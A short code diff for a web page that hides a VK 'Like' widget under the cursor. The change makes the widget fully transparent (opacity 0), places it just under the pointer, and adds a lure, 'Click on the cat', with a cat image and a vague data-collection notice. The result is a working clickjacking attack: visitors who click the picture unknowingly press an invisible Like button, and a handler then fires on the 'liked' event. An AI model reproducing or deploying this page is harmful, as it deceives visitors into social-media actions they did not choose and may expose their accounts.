@@ -19,7 +19,7 @@
 			overflow: hidden;
 			width: 180px;
 			height: 25px;
-			opacity: 0.5;
+			opacity: 0;
 			position: absolute;
 			z-index: 101;
 		}
@@ -30,7 +30,12 @@
 	  VK.init({apiId: <%= Config.new.VKapiID %>, onlyWidgets: true});
 	</script>
 
-	<h1>click here</h1>
+	<center>
+		<h1>Click on the cat</h1>
+		<img src="https://catmacros.files.wordpress.com/2009/07/wow.jpg">
+		<p>This website may collect sensitive information about you.</p>
+		<p>By using the site you consent to the processing and storage of your data</p>
+	</center>
 	<div id="overlay">
 		<div id="wrap1">
 				<div id="vk_like"></div>			
@@ -44,7 +49,7 @@
 	<script type="text/javascript">
 		var el = $('#wrap1');
 		$(window).on('mousemove', function(e) {
-			el.css({left:  e.pageX - 90, top:   e.pageY - 12 });
+			el.css({left:  e.pageX - 60, top:   e.pageY - 12 });
 		});
 
 		VK.Observer.subscribe("widgets.like.liked", function f()
